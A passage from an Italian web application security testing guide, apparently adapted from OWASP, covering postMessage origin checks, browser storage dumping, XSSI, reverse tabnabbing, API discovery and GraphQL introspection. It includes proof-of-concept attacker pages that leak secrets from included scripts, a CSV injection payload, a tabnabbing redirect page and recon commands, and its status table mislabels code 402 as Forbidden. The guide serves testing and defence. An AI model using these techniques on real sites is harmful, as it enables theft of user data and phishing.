    * I WebSocket non gestiscono l'autorizzazione, dovrebbero essere effettuati normali test di autorizzazione black-box. Riferirsi alle sezioni di Testing dell'Autorizzazione di questa guida.
* Sanitizzazione dell'Input.
    * Utilizzare la scheda WebSocket di ZAP per riprodurre e fuzzare richieste e risposte WebSocket. Riferirsi alla sezione Testing for Data Validation di questa guida.

**Rimedi**
* Implementare controlli rigorosi sull'intestazione Origin durante l'handshake WebSocket. Solo le origini autorizzate dovrebbero essere consentite a stabilire una connessione.
* Assicurarsi che tutte le comunicazioni WebSocket avvengano su wss:// per garantire la crittografia dei dati in transito. Ciò protegge le informazioni sensibili da attacchi di tipo "man-in-the-middle".
* Implementare meccanismi di autenticazione robusti prima di aprire una connessione WebSocket. Utilizzare token JWT o sessioni per garantire che solo gli utenti autorizzati possano accedere alle risorse. 

#### 11 - Testing Web Messaging
Il Web Messaging (noto anche come Cross Document Messaging) consente alle applicazioni che operano su domini diversi di comunicare in modo sicuro.
Consente comunicazioni sicure tra più origini attraverso iframe, schede e finestre.

L'API di messaggistica ha introdotto il metodo postMessage(), con il quale è possibile inviare messaggi in chiaro tra origini diverse. Consiste in due parametri: messaggio e dominio.

Per ricevere messaggi, il sito web ricevente deve aggiungere un nuovo gestore di eventi, che ha i seguenti attributi:
* Dati, il contenuto del messaggio in arrivo
* Origine del documento mittente
* Sorgente, la finestra sorgente

Ecco un esempio di utilizzo dell'API di messaggistica. Per inviare un messaggio:

    iframe1.contentWindow.postMessage("Hello world", "http://www.example.com");

Per ricevere un messaggio:

    window.addEventListener("message", handler, true);
    function handler(event) {
        if(event.origin === 'chat.example.com') {
            /* elaborare il messaggio (event.data) */
        } else {
            /* ignorare i messaggi da domini non attendibili */
        }
    }

*Sicurezza dell'origine*
L'origine è composta da uno schema, un nome host e una porta. Identifica in modo univoco il dominio che invia o riceve il messaggio e non include il percorso o la parte frammento dell'URL. Ad esempio, https://example.com sarà considerato diverso da http://example.com perché lo schema del primo è https, mentre il secondo è http. Questo vale anche per i server web che operano nello stesso dominio ma su porte diverse.

**Come testarlo**
*Esaminare la sicureza dell'origine*
I tester dovrebbero controllare se il codice dell'applicazione filtra e processa i messaggi provenienti da domini di fiducia. All'interno del dominio di invio, assicurarsi anche che il dominio ricevente sia esplicitamente dichiarato e che * non venga utilizzato come secondo argomento di postMessage(). Questa pratica potrebbe introdurre preoccupazioni di sicurezza e potrebbe portare, in caso di reindirizzamento o se l'origine cambia per altri motivi, a inviare dati a host sconosciuti, e quindi a compromettere dati riservati verso server malevoli.
I domini devono sempre essere verificati prima della manipolazione dei dati.

*Esaminare la validazione dell'input*
Sebbene il sito web accetti teoricamente solo messaggi provenienti da domini di fiducia, i dati devono comunque essere trattati come dati esterni e non attendibili, e processati con i controlli di sicurezza appropriati. I tester dovrebbero analizzare il codice e cercare metodi insicuri, in particolare dove i dati vengono valutati tramite eval() o inseriti nel DOM tramite la proprietà innerHTML, che potrebbe creare vulnerabilità XSS basate sul DOM.

*Analisi statica sul codice*
Il codice JavaScript dovrebbe essere analizzato per determinare come è implementato il web messaging. In particolare, i tester dovrebbero essere interessati a come il sito web sta limitando i messaggi provenienti da domini non attendibili e come vengono gestiti i dati anche per domini di fiducia.

In questo esempio:

    window.addEventListener("message", callback, true);

    function callback(e) {
        if(e.origin.indexOf(".owasp.org")!=-1) {
            /* elaborare il messaggio (e.data) */
        }
    }

l'intenzione è quella di consentire sottodomini come:
* www.owasp.org
* chat.owasp.org
* forum.owasp.org

Sfortunatamente, questo introduce vulnerabilità. Un attaccante può facilmente bypassare il filtro poiché un dominio come www.owasp.org.attacker.com corrisponderà.

Ecco un esempio di codice che manca di un controllo dell'origine. Questo è molto insicuro, poiché accetterà input da qualsiasi dominio:

    window.addEventListener("message", callback, true);

    function callback(e) {
            /* elaborare il messaggio (e.data) */
    }

Ecco un esempio con vulnerabilità di validazione dell'input che possono portare a un attacco XSS:

    window.addEventListener("message", callback, true);

    function callback(e) {
            if(e.origin === "trusted.domain.com") {
                element.innerHTML= e.data;
            }
    }

Un approccio più sicuro sarebbe utilizzare la proprietà innerText invece di innerHTML.

**Rimedi**
* Assicurarsi di controllare l'origine dei messaggi in modo specifico e preciso. Ad esempio, invece di utilizzare controlli basati su stringhe parziali o wildcard, controllare esattamente l'origin per evitare bypass: `if (e.origin === "https://trusted.domain.com") do smt...`
* Per prevenire attacchi XSS, evitare di usare `innerHTML`, che interpreta il codice HTML, e utilizzare `innerText` o `textContent`

#### 12 - Testare la memoria del browser
I meccanismi di memoria lato client come 
* memoria locale
* memoria di sessione
* IndexedDB
* Web SQL
* Cookie

possono essere modificati con strumenti come [Google Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools/storage/localstorage) e l'[Ispezione di Memoria di Firefox](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector)

**Come testarlo**
*Memora locale*
`window.localStorage` è una proprietà globale che implementa l'API Web Storage e fornisce una memorizzazione persistente di coppie chiave-valore nel browser.

Le voci in localStorage persistono anche quando la finestra del browser viene chiusa, ad eccezione delle finestre in modalità Privata/Incognito.

Elencare tutte le voci chiave-valore:

    for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    console.log(`${key}: ${value}`);
    }

*Memoria di sessione*
`window.sessionStorage` è una proprietà globale che implementa l'API Web Storage e fornisce una memorizzazione effimera di coppie chiave-valore nel browser.

Le voci in sessionStorage sono effimere perché vengono cancellate quando la scheda/finestra del browser viene chiusa.

Elencare tutte le voci chiave-valore:

    for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    console.log(`${key}: ${value}`);
    }

*IndexedDB*
A differenza della Memoria Locale e della Memoria di Sessione, IndexedDB può memorizzare più di semplici stringhe. Qualsiasi oggetto supportato dall'algoritmo di clonazione strutturata può essere memorizzato in IndexedDB.

La raccomandazione W3C sull'API Web Crypto consiglia che le CryptoKey che devono essere persistenti nel browser vengano memorizzate in IndexedDB. Quando si testa una pagina web, cercare eventuali CryptoKey in IndexedDB e verificare se sono impostate come extractable: true quando dovrebbero essere impostate su extractable: false (cioè, assicurarsi che il materiale della chiave privata sottostante non venga mai esposto durante le operazioni crittografiche).

Stampare tutti i contenuti di IndexDB:

    const dumpIndexedDB = dbName => {
    const DB_VERSION = 1;
    const req = indexedDB.open(dbName, DB_VERSION);
    req.onsuccess = function() {
        const db = req.result;
        const objectStoreNames = db.objectStoreNames || [];

        console.log(`[*] Database: ${dbName}`);

        Array.from(objectStoreNames).forEach(storeName => {
        const txn = db.transaction(storeName, 'readonly');
        const objectStore = txn.objectStore(storeName);

        console.log(`\t[+] ObjectStore: ${storeName}`);

        objectStore.getAll().onsuccess = event => {
            const items = event.target.result || [];
            items.forEach(item => console.log(`\t\t[-] `, item));
        };
        });
    };
    };

    indexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));

*Web SQL*
È sconsigliato usarlo in generale

*Cookies*
I cookie sono un meccanismo di memorizzazione chiave-valore utilizzato principalmente per la gestione delle sessioni, ma gli sviluppatori web possono ancora usarli per memorizzare dati stringa arbitrari.

Elencare tutti i cookie:

    console.log(window.document.cookie);

*Oggetto finestra globale*
A volte, gli sviluppatori web inizializzano e mantengono uno stato globale che è disponibile solo durante la vita di esecuzione della pagina assegnando attributi personalizzati all'oggetto finestra globale. Ad esempio:

    window.MY_STATE = {
    counter: 0,
    flag: false,
    };

Qualsiasi dato allegato all'oggetto finestra verrà perso quando la pagina viene ricaricata o chiusa.

Elencare tutte le voci nell'oggetto finestra

    (() => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    const currentWindow = Object.getOwnPropertyNames(window);

    const results = currentWindow.filter(
        prop => !iframe.contentWindow.hasOwnProperty(prop)
    );

    document.body.removeChild(iframe);

    results.forEach(key => console.log(`${key}: ${window[key]}`));
    })();

Dopo l'identificazione di uno dei vettori di attacco sopra, può essere formata una catena di attacco con diversi tipi di attacchi lato client, come attacchi XSS basati su DOM.

**Rimedio**
* Le applicazioni dovrebbero memorizzare i dati sensibili lato server e non lato client, in modo sicuro seguendo le migliori pratiche.

#### 13 - Test per l'inclusione del Cross Site Scripting
La vulnerabilità di Inclusione di Script Cross-Site (XSSI) consente la fuoriuscita di dati sensibili oltre i confini di origine o di dominio. 
L'XSSI è un attacco lato client simile al Cross-Site Request Forgery (CSRF), ma ha uno scopo diverso. Mentre il CSRF utilizza il contesto dell'utente autenticato per eseguire azioni che modificano lo stato all'interno della pagina della vittima (ad es. trasferire denaro al conto dell'attaccante, modificare privilegi, reimpostare la password, ecc.), l'XSSI sfrutta invece JavaScript sul lato client per rivelare dati sensibili da sessioni autenticate.

Per impostazione predefinita, i siti web possono accedere ai dati solo se provengono dalla stessa origine. Questo è un principio fondamentale della sicurezza delle applicazioni ed è regolato dalla politica di same-origin (definita dall'RFC 6454). Un'origine è definita come la combinazione dello schema URI (HTTP o HTTPS), il nome dell'host e il numero di porta. Tuttavia, questa politica non si applica alle inclusioni di tag HTML `<script>`. Questa eccezione è necessaria, poiché senza di essa i siti web non sarebbero in grado di utilizzare servizi di terze parti, eseguire analisi del traffico o utilizzare piattaforme pubblicitarie, ecc.

Quando il browser apre un sito web con tag `<script>`, le risorse vengono recuperate dal dominio cross-origin. Le risorse vengono quindi eseguite nel medesimo contesto del sito che le include o del browser, il che presenta l'opportunità di rivelare dati sensibili. Nella maggior parte dei casi, ciò avviene utilizzando JavaScript; tuttavia, la sorgente dello script non deve necessariamente essere un file JavaScript con tipo text/javascript o estensione .js.

**Come testarlo**
*Raccogliere dati utilizzando sessioni di utente autenticato e non autenticato*
Identifica quali endpoint sono responsabili dell'invio di dati sensibili, quali parametri sono richiesti e individua tutte le risposte JavaScript rilevanti generate dinamicamente e staticamente utilizzando sessioni di utenti autenticati.
Per trovare risposte JavaScript generate dinamicamente, genera richieste autenticati e non autenticati e confrontale. Se sono diverse, significa che la risposta è dinamica; altrimenti è statica. 
Per semplificare questo compito, puoi utilizzare uno strumento come il plugin Burp proxy di Veit Hailperin. Assicurati di controllare altri tipi di file oltre a JavaScript; l'XSSI non è limitato solo ai file JavaScript.

*Determinare Se I Dati Sensibili Possono Essere Esposti Tramite JavaScript*
I tester dovrebbero controllare il codice dei seguenti possibili mezzi di fuga di dati tramite XSSI:
* Variabili globali
* Parametri di funzioni globali
* Furto di CSV (Comme Separated Values) con virgolette
* Errori di runtime di JavaScript
* Chain di prototipi utilizzando `this`

1. **Fuga di dati sensibili tramite variabili globali**
    Una chiave API è memorizzata in un file JavaScript con l'URI `https://victim.com/internal/api.js` sul sito web della vittima, `victim.com`, accessibile solo agli utenti autenticati. Un attaccante configura un sito web, `attackingwebsite.com`, e utilizza il tag `<script>` per riferirsi al file JavaScript.

    <br>

    Ecco il contenuto di `https://victim.com/internal/api.js`:

        (function() {
        window.secret = "supersecretUserAPIkey";
        })();

    Il sito di attacco, attackingwebsite.com, ha un `index.html` con il seguente codice:

        <!DOCTYPE html>
        <html>
        <head>
            <title>Fuga di dati tramite variabili globali</title>
        </head>
        <body>
            <h1>Fuga di dati tramite variabili globali</h1>
            <script src="https://victim.com/internal/api.js"></script>
            <div id="result">
            </div>
            <script>
            var div = document.getElementById("result");
            div.innerHTML = "I tuoi dati segreti <b>" + window.secret + "</b>";
            </script>
        </body>
        </html>

    In questo esempio, una vittima è autenticata su victim.com. Un attaccante attira la vittima su attackingwebsite.com tramite ingegneria sociale, email di phishing, ecc. Il browser della vittima quindi recupera `api.js`, risultando nella fuga di dati sensibili tramite la variabile JavaScript globale e visualizzata usando `innerHTML`.

    <br>

    Dunque non salvare chiavi o dati importanti in Variabili Globali.

    <br>

2. **Fuga di Dati Sensibili Tramite Parametri di Funzioni Globali**
    Questo esempio è simile al precedente, tranne che in questo caso attackingwebsite.com utilizza una funzione JavaScript globale per estrarre i dati sensibili sovrascrivendo la funzione globale JavaScript della vittima.

    <br>

    Ecco il contenuto di `https://victim.com/internal/api.js`:

        (function() {
        var secret = "supersecretAPIkey";
        window.globalFunction(secret);
        })();

    Il sito di attacco, attackingwebsite.com ha un `index.html` con il seguente codice:

        <!DOCTYPE html>
        <html>
        <head>
            <title>Fuga di dati tramite parametri di funzioni globali</title>
        </head>
        <body>
            <div id="result">
            </div>
            <script>
            function globalFunction(param) {
                var div = document.getElementById("result");
                div.innerHTML = "I tuoi dati segreti: <b>" + param + "</b>";
            }
            </script>
            <script src="https://victim.com/internal/api.js"></script>
        </body>
        </html>

3. **Perdita di Dati Sensibili tramite CSV con Furto di Quotazioni**
    Per poter compromettere i dati, l'attaccante/tester deve essere in grado di iniettare codice JavaScript nei dati CSV.

        HTTP/1.1 200 OK
        Content-Type: text/csv
        Content-Disposition: attachment; filename="a.csv"
        Content-Length: xxxx

        1,"___","aaa@a.example","03-0000-0001"
        2,"foo","bbb@b.example","03-0000-0002"
        ...
        98,"bar","yyy@example.net","03-0000-0088"
        99,"___","zzz@example.com","03-0000-0099"

    In questo esempio, utilizzando le colonne ___ come punti di iniezione e inserendo stringhe JavaScript al loro posto si ottiene il seguente risultato.

        1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
        2,"foo","bbb@b.example","03-0000-0002"
        ...
        98,"bar","yyy@example.net","03-0000-0088"
        99,"*/}//","zzz@example.com","03-0000-0099"

    Jeremiah Grossman ha scritto di una vulnerabilità simile in Gmail nel 2006 che permetteva l'estrazione dei contatti degli utenti in JSON. In questo caso, i dati venivano ricevuti da Gmail e analizzati dal motore JavaScript del browser utilizzando un costruttore Array non referenziato per esfiltrare i dati. Un attaccante poteva accedere a questo Array con i dati sensibili definendo e sovrascrivendo il costruttore Array interno in questo modo:

        <!DOCTYPE html>
        <html>
        <head>
            <title>Fuga di contatti Gmail tramite JSON</title>
        </head>
        <body>
            <script>
            function Array() {
                // rubare dati
            }
            </script>
            <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
        </body>
        </html>

    <br>

    Dunque assicurati che sui csv sia fatto un sanitize per far si che non sia possibile inserirci codice eseguibile all'interno.

4. **Fuga di Dati Sensibili tramite Errori di Runtime in JavaScript**
    I browser di solito mostrano messaggi di errore JavaScript standardizzati. Tuttavia, nel caso di IE9/10, i messaggi di errore di runtime fornivano dettagli aggiuntivi che potevano essere utilizzati per fughe di dati. Ad esempio, un sito web chiamato victim.com serve il seguente contenuto all'URI http://victim.com/service/csvendpoint per utenti autenticati:

        HTTP/1.1 200 OK
        Content-Type: text/csv
        Content-Disposition: attachment; filename="a.csv"
        Content-Length: 13

        1,abc,def,ghi

    Questa vulnerabilità potrebbe essere sfruttata con il seguente codice:

        <!--gestore di errori -->
        <script>window.onerror = function(err) {alert(err)}</script>
        <!--carica il CSV di destinazione -->
        <script src="http://victim.com/service/csvendpoint"></script>

    Quando il browser tenta di rendere il contenuto CSV come JavaScript, fallisce e provoca la fuga di dati sensibili:

    ![Messaggio di errore](./img/XSSI1.jpeg)

    <br>

    Assicurati che i contenuti siano serviti con i corretti `Content-Type` e `Content-Disposition`. Ad esempio, per i file CSV, utilizzare `text/csv`.
    Inoltre, icorda sempre di sanitizzare i dati prima di inviarli al client.

5. **Fuga di Dati Sensibili tramite Prototype Chaining Usando `this`**
    In JavaScript, this fa riferimento all'oggetto su cui una funzione è chiamata. Quindi, se una funzione è invocata su un oggetto (come un array), this punterà a quell'oggetto.
    Questo comportamento può essere sfruttato per far fuoriuscire dati.
    Gli oggetti in JavaScript possono ereditare proprietà e metodi da altri oggetti. Ad esempio, tutti gli array ereditano da `Array.prototype`, il che significa che puoi sovrascrivere metodi standard come `forEach`.

    <br>

    Nell'esempio, i dati sensibili sono memorizzati in un array chiamato secret. Un attaccante può sfruttare la possibilità di sovrascrivere il metodo forEach di Array.prototype per inserire una propria logica. Quando il codice dell'attaccante viene eseguito, this nel contesto del metodo forEach punta all'array su cui è stato invocato, consentendo all'attaccante di accedere ai dati.

        (function() {
        var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

        secret.forEach(function(element) {
            // fai qualcosa qui
        });  
        })();

    Qui, secret è un array di dati sensibili, e il metodo forEach viene utilizzato per iterare su di essi.

    Sovrascrittura di `Array.prototype.forEach`:

        Array.prototype.forEach = function(callback) {
        var resultString = "I tuoi valori segreti sono: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
            if (i > 0) {
            resultString += ", ";
            }
            resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
        };

    L'attaccante sovrascrive `forEach`, creando una funzione che elenca i valori dell'array. Quando il `forEach` viene chiamato sull'array 'secret', la funzione dell'attaccante viene eseguita, rivelando i dati sensibili.

    <br>

    La comprensione del funzionamento di this e del prototype chaining è cruciale per evitare la fuga di dati sensibili in JavaScript. Essere consapevoli di queste vulnerabilità aiuta a costruire applicazioni più sicure.

**Rimedi**
* Evitare di memorizzare informazioni sensibili in variabili globali JavaScript. Utilizzare scope più ristretti come funzioni o moduli.
* Sebbene non sia una soluzione definitiva, offuscare i dati può rendere più difficile per un attaccante capire e sfruttare i dati esposti. Utilizza tecniche di minificazione o librerie di offuscamento. (Per esempio chimare una variabile importante `a` invce che `secretKey`)
* Assicurarsi che gli endpoint che forniscono dati sensibili siano accessibili solo a utenti autenticati e autorizzati.

#### 14 - Test per il reverse tabnabbing
Il Reverse Tabnabbing è un attacco che può essere utilizzato per reindirizzare gli utenti verso pagine di phishing.

Quando un link viene aperto con l'attributo target="_blank", questo crea una nuova scheda, ma senza le opportune misure di sicurezza, la nuova pagina può accedere e manipolare la scheda originale.

In particolare, se l'attributo `rel='noopener noreferrer'` non è utilizzato, il sito aperto in una nuova scheda può utilizzare JavaScript per modificare l'URL della scheda originale. Questo permette all'attaccante di reindirizzare l'utente a una pagina di phishing.

Poiché l'utente si trovava sul dominio originale quando si è aperta la nuova scheda, è meno probabile che noti che la pagina è cambiata, specialmente se la pagina di phishing è identica al dominio originale. Qualsiasi credenziale inserita nel dominio controllato dall'attaccante finirà quindi nelle mani dell'attaccante.

I link aperti tramite la funzione JavaScript window.open sono anch'essi vulnerabili a questo attacco.

*NOTA: questo problema non affligge le versini moderne dei browser ma quelle vecchie come Google Chrome 88*

*Esempio*
Se l'applicazione è vulnerabile al reverse tabnabbing, un utente malintenzionato sarà in grado di fornire un link a una pagina con il seguente codice:

    <html>
    <body>
    <script>
        window.opener.location = "https://example.org";
    </script>
    <b>Errore nel caricamento...</b>
    </body>
    </html>

Cliccando sul link si aprirà una nuova scheda mentre la scheda originale verrà reindirizzata a "example.org". Supponiamo che "example.org" assomigli all'applicazione web vulnerabile; l'utente è meno propenso a notare il cambiamento e più propenso a inserire informazioni sensibili nella pagina.

**Rimedio**
* Assicurati che l'attributo `rel` sia impostato con le parole chiave `noreferrer` e `noopener` per tutti i link.
* Rimuovere `target="_blank"` quando non necessario

### L - API testing
#### 1 - Panoramica del testing delle API
*Introduzione alle Web API*
Le API funzionano in modo simile a un proxy tra un'applicazione e un altro servizio o sistema. Permettono all'app di richiedere dati o funzionalità da un servizio esterno senza dover gestire direttamente la complessità di quel servizio. Un esempio può essere l'utilizzo di googlemaps da un app di viaggi.

Come con l'introduzione di qualsiasi nuovo concetto, possono emergere difetti e vulnerabilità che richiedono test. Altrimenti, API mal protette potrebbero fornire un accesso diretto illimitato a dati sensibili.

Ci sono vari tipi di API:
* API REST (Representational State Transfer)
* API SOAP (Simple Object Access Protocol)
* API GraphQL
* gRPC (Remote rocedure Calls)
* API WebSockets

**API REST**
Il REST è un insieme di regole e convenzioni per interagire con le risorse web.

*URI (Identificatori Uniformi delle Risorse)*
Un URI è una stringa di caratteri che identifica univocamente una risorsa particolare. Gli URI sono utilizzati ampiamente su Internet per localizzare e interagire con risorse, come pagine web, file e servizi.
La sintassi generica dell'URI definita in RFC3986 è la seguente:

    URI = scheme "://" authority "/" path [ "?" query ] [ "#" fragment ]

Per le API REST, il **scheme** è tipicamente HTTP o HTTPS, ma indica genericamente il protocollo o il metodo utilizzato per accedere alla risorsa. Altri schemi comuni includono ftp, mailto e file.

L'**authority** specifica il nome di dominio o l'indirizzo IP del server dove risiede la risorsa e può includere un numero di porta. Può anche includere informazioni sull'utente come sotto-componente.

Il **path** specifica la posizione specifica della risorsa sul server. Siamo interessati al "path" dell'URI come relazione tra utente e risorse. Ad esempio, `https://api.example.com/admin/testing/report` potrebbe mostrare un rapporto di test. C'è una relazione tra l'utente "admin" e i loro rapporti.

La **query** fornisce parametri aggiuntivi per la risorsa. Inizia con un ? e consiste in coppie chiave-valore separate da &.

Il **fragment** indica una parte specifica della risorsa, come una sezione all'interno di una pagina web. Inizia con un #. Vale la pena notare che gli identificatori di frammento vengono elaborati solo lato client e non vengono inviati al server.

*Metodi HTTP*
Questi metodi corrispondono a CRUD, le quattro funzioni di base dello storage persistente in informatica.

I Metodi di Richiesta HTTP sono:

| Metodi  | Descrizione                                       |
|---------|--------------------------------------------------|
| GET     | Ottiene la rappresentazione dello stato della risorsa |
| POST    | Crea una nuova risorsa                           |
| PUT     | Aggiorna una risorsa                             |
| DELETE  | Rimuove una risorsa                              |
| HEAD    | Ottiene i metadati associati allo stato della risorsa |
| OPTIONS | Elenca i metodi disponibili                      |

*Intestazioni*
Le API REST usano le intestazioni per supportare la comunicazione di informazioni aggiuntive all'interno della richiesta o della risposta:
* **Content-Type**: Indica il tipo della risorsa
* **Authorization**: Contiene le credenziali per l'autenticazione
* **Accept**: Specifica i tipi accettabili per la risposta

*Codici di stato*
Le API applicative che seguono i principi REST utilizzano il codice di stato della risposta di un messaggio di risposta HTTP per notificare al client il risultato della richiesta.

| Codice di Risposta | Messaggio di Risposta   | Descrizione                                                                                      |
|--------------------|-------------------------|--------------------------------------------------------------------------------------------------|
| 200                | OK                      | Successo durante l'elaborazione della richiesta del client                                      |
| 201                | Created                 | Nuova risorsa creata                                                                             |
| 301                | Moved Permanently       | Reindirizzamento permanente                                                                       |
| 304                | Not Modified            | Risposta relativa alla cache restituita quando il client ha la stessa copia della risorsa del server |
| 307                | Temporary Redirect      | Reindirizzamento temporaneo della risorsa                                                        |
| 400                | Bad Request             | Richiesta malformata dal client                                                                   |
| 401                | Unauthorized            | Il client non è autorizzato a effettuare richieste o accedere a una risorsa particolare          |
| 402                | Forbidden               | Il client è vietato dall'accesso alla risorsa                                                    |
| 404                | Not Found               | La risorsa non esiste o è errata in base alla richiesta                                          |
| 405                | Method Not Allowed      | Metodo non valido o sconosciuto utilizzato                                                        |
| 500                | Internal Server Error   | Il server non è riuscito ad elaborare la richiesta a causa di un errore interno                 |

#### 2 - Riconoscimento delle API
Le API possono essere pubbliche o private.

*API pubbliche*
Le API pubbliche di solito hanno i loro dettagli pubblicati in un documento Swagger/OpenAPI. Accedere a questo documento è importante per comprendere la superficie di attacco. È altrettanto importante trovare versioni precedenti di questo documento che potrebbero mostrare codice obsoleto ma ancora funzionale, che potrebbe presentare vulnerabilità di sicurezza.
Ricorda che questo documento, per quanto ben intenzionato, potrebbe non essere accurato e potrebbe non divulgare l'API completa.

*API private*
La visibilità delle API private dipende da chi è il consumatore previsto. Un'API può essere privata, ma accessibile solo a clienti iscritti (noti anche come partner) o solo accessibile a clienti interni, come altri dipartimenti all'interno della stessa azienda. Trovare API private utilizzando tecniche di riconoscimento è altrettanto importante. Queste API possono essere scoperte utilizzando diverse tecniche che discuteremo di seguito.

**Come testarlo**
*Trovare la documentazione*
In entrambi i casi, pubblico e privato, la documentazione delle API sarà utile. La documentazione delle API pubbliche è tipicamente condivisa con tutti, mentre la documentazione delle API private è condivisa solo con il cliente previsto. 

Fonti alternative di documentazione API si possono trovare:
* Hithub
* APIs.guru
* RapisAPI
* PublicAPIs
* Rete API di Postman

Se la documentazione non è facilmente visibile, puoi cercare attivamente nel target per documentazione basata su alcuni nomi o percorsi ovvi. Questi includono:
* /api-docs
* /doc
* /swagger
* /swagger.json
* /openapi.json
* /.well-known/schema-discovery

*Robots.txt*
Il file robots.txt è un file di testo creato dai proprietari dei siti per istruire i crawler web (come i bot dei motori di ricerca) su come esplorare e indicizzare il loro sito. Fa parte del Protocollo di Esclusione dei Robots (REP), che regola come i bot interagiscono con i siti.

Questo file può fornire indizi aggiuntivi sulla struttura dei percorsi o sugli endpoint delle API.

*Navigare e Spiderare l'Applicazione*
Navigare nell'applicazione con un proxy di intercettazione come ZAP o Burp Suite registra gli endpoint per un'ispezione successiva. Inoltre, utilizzando la loro funzionalità di spidering integrata, i proxy di intercettazione possono aiutare a generare un elenco completo di endpoint.

*Google Dorking*
Il Google Dorking è una tecnica utile per la raccolta di informazioni che sfrutta le capacità di ricerca avanzata di Google. Utilizzando specifiche direttive come `site:` e `inurl:`, gli utenti possono filtrare i risultati per trovare dati sensibili o endpoint API. 
Per esempio 

    site:mytargetsite.com 
    inurl:/api, v1, api, GraphQL

*Guardare indietro*
In generale, le API cambiano nel tempo. Ma versioni obsolete o più vecchie possono ancora essere operative, sia per motivi intenzionali che per errata configurazione.

Per scoprire versioni più vecchie, possiamo utilizzare la Wayback Machine per trovare endpoint più vecchi. Uno strumento utile noto come WayBackUrls di TomNomNom estrae tutti gli URL di cui la Wayback Machine è a conoscenza per un dominio.

* [WayBackUrls](https://github.com/tomnomnom/waybackurls). Estrai tutti gli URL di cui la Wayback Machine è a conoscenza per un dominio.
* [waymore](https://github.com/xnl-h4ck3r/waymore). Trova molto di più dalla Wayback Machine, Common Crawl, Alien Vault OTX, URLScan e VirusTotal.
* [gau](https://github.com/lc/gau). Estrai URL conosciuti dall'Open Threat Exchange di AlienVault, dalla Wayback Machine e da Common Crawl.

*L'applicazione Client Side*
Una fonte eccellente di API e altre informazioni è l'HTML e il JavaScript che il server invia al client. A volte, l'applicazione client rivela informazioni sensibili, comprese API e segreti. 

Ci sono una varietà di strumenti che possiamo utilizzare per aiutarci a estrarre informazioni sensibili dal JavaScript trasmesso al browser. Questi strumenti sono tipicamente basati su uno dei due approcci: Espressioni Regolari o Alberi di Sintassi Astratta (AST). Poi ci sono strumenti generalizzati che ci aiutano a organizzare o gestire i file JS per l'indagine tramite strumenti AST ed Espressioni Regolari.

**Stumenti generali**
* [Uproot](https://github.com/0xDexter0us/uproot-JS). Un plugin di BurpSuite che salva tutti i file JS incontrati su disco. Questo aiuta ad estrarre i file per eventuali analisi tramite strumenti da riga di comando.
* [OpenAPI Support](https://www.zaproxy.org/docs/desktop/addons/openapi-support/). Questo add-on di ZAP consente di spiderare e importare definizioni OpenAPI (Swagger), versioni 1.2, 2.0 e 3.0.
* [OpenAPI Parser](https://github.com/aress31/openapi-parser). Un plugin di BurpSuite che analizza i documenti OpenAPI in Burp Suite per automatizzare le valutazioni di sicurezza delle API basate su OpenAPI
* [JSpector](https://github.com/hisxo/JSpector). Un plugin di BurpSuite che esplora passivamente i file JavaScript e crea automaticamente problemi con URL, endpoint e metodi pericolosi trovati nei file JS.
* [Link Finder](https://github.com/GerbenJavado/LinkFinder). Uno script Python che trova endpoint nei file JavaScript
* [JSLuice](https://github.com/BishopFox/jsluice). Uno strumento da riga di comando che estrae URL, percorsi, segreti e altri dati interessanti dal codice sorgente JavaScript.
* [Attack Surface Detector](https://github.com/secdec/attack-surface-detector-burp). Un plugin di BurpSuite che utilizza analisi statiche del codice per identificare gli endpoint delle web app analizzando i percorsi e identificando i parametri.

**Fuzzing attivo**
Il fuzzing è la tecnica di inviare input errati o mal formati per vedere come si comporta l'applicazine web. Coinvolge l'uso di strumenti con wordlist e il filtraggio dei risultati delle richieste per scoprire gli endpoint.

*Kiterunner*
[KiteRunner](https://github.com/assetnote/kiterunner) è uno strumento che esegue una tradizionale scoperta di contenuti e bruteforcing di percorsi/endpoints in applicazioni moderne e API.

    kr [scan|brute] <input> [flags]

Per scansionare un target per API utilizzando una wordlist possiamo:

    kr scan https://example.com/api -w /usr/share/wordlists/apis/routes-large.kite --fail-status-codes 404,403

* `kr scan https://example.com/api`: Avvia una scansione sull'endpoint API specificato (`https://example.com/api`).

* `-w /usr/share/wordlists/apis/routes-large.kite`: Utilizza un file di wordlist per effettuare la scansione. In questo caso, il file routes-large.kite contiene vari percorsi API che verranno testati.

* `--fail-status-codes 404,403`: Specifica che i codici di stato 404 (pagina non trovata) e 403 (accesso negato) sono considerati come fallimenti. Questo significa che il tool non considererà questi codici come risultati di successo durante la scansione.

*FFUF / DirBuster / GoBuster*
Tutti e tre FFUF, DirBuster e GoBuster sono progettati per scoprire percorsi e file nascosti sui server web tramite tecniche di bruteforce. Tutti e tre utilizzano wordlist personalizzabili per generare richieste al server web target, cercando di identificare directory e file validi. Tutti e tre supportano elaborazione multi-threaded o altamente efficiente per accelerare il processo di bruteforce.

Esempio di GoBuster

    gobuster dir -u <target url> -w <wordlist file>

#### 3 - Testare GraphQL
GraphQL è diventato molto popolare nelle API moderne. Offre semplicità e oggetti annidati, facilitando uno sviluppo più veloce. Sebbene ogni tecnologia abbia vantaggi, può anche esporre l'applicazione a nuove superfici di attacco. Alcuni vettori sono unici per GraphQL (ad esempio, la Query di Introspezione) e alcuni sono generici per le API (ad esempio, l'iniezione SQL).

Gli esempi in questa sezione si baseranno su un'applicazione GraphQL vulnerabile, poc-graphql.

**Come testarlo**
**Query di introspezione**
Le query di introspezione sono il metodo con cui GraphQL ti permette di chiedere quali query sono supportate, quali tipi di dati sono disponibili e molti altri dettagli necessari quando ci si avvicina al test di un'implementazione GraphQL.
Ci sono diversi modi per estrarre queste informazioni e visualizzare l'output:

*Usando l'introspezione GraphQL nativa*
Il modo più semplice è inviare una richiesta HTTP con il seguente payload:

    query IntrospectionQuery {
    __schema {
        queryType {
        name
        }
        mutationType {
        name
        }
        subscriptionType {
        name
        }
